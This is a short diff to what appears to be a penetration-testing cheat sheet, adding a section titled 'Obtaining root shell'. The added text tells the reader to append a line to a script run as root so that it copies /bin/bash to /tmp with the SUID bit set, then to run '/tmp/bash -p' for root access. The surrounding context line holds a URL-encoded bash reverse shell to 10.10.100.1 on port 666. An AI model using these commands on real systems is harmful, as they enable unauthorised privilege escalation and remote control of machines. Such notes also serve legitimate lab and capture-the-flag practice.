@@ -41,6 +41,18 @@ bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E100%2E1%2F666%200%3E%261
 
 ---
 
+## Obtaining root shell
+
+```shell
+# Add the following to a file that is runned as root to obtain a shell
+echo "cp /bin/bash /tmp && chmod +s /tmp/bash" >> /etc/FILE.sh
+```
+
+- When the script will be executed, it will copy the `/bin/bash` to `/tmp` directory and make it a SUID.
+- Now you can do `/tmp/bash -p` and you should have root permissions
+
+---
+
 ## How to stabilise a shell:
 
 ```shell
